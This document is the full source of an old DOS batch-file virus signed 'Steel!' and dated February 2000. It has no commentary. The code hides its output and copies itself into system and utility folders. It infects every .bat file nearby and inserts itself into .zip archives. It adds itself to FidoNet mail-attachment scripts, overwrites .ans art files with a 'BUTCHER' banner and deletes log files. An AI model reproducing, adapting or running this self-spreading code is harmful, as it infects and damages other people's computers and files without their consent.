@ctty nul
if "%0"=="AUTOEXEC.BAT" goto aut
goto yui
:aut
cls
exit
:yui
@ctty nul
if exist c:\rywblk.txt goto okok
@ctty nul
type ok >> c:\rywblk.txt
copy %0 c:\%0
c:\fido\%0
c:\util\%0
d:\util\%0
%winbootdir%\%0
d:\tools\%0
c:\tools\%0
echo. >> c:\fido\attach.bat
echo attach.exe -A -L %0 >> c:\fido\attach.bat
attrib c:\rywblk.txt +h +r
:okok
if exist c:\butcher.txt goto cont
echo ษออออออออออออออออออออออออออออออออออออออออป >> c:\butcher.txt
echo บ    Sorry, but you have new modify of   บ >> c:\butcher.txt
echo บ 2000   BUTCHER... Please Sorry   2000  บ >> c:\butcher.txt
echo ศออออออออออออออออออออออออออออออออออออออออผ >> c:\butcher.txt
:cont
for %%a in (*.bat ..\*.bat) do if %%a==ATTACH.BAT goto att
goto re
:att
echo. >> attach.bat
echo attach.exe -A -L %0 >> attach.bat
exit
:re
for %%b in (*.bat ..\*.bat) do find "TRTL" %%b
if not errorlevel 1 exit
for %%c in (*.bat ..\*.bat ..\..\*.bat) do copy /b %%c+%0
:next
for %%d in (*.zip ..\*.zip) do pkzip %%d %0
for %%e in (*.ans c:\max\*.ans) do copy c:\butcher.txt %%q
del *.log
copy %0 >> %1 %2 %3 %4 %5
@ctty con
: (c) Steel! End of February 2000...
:     Version 1.27
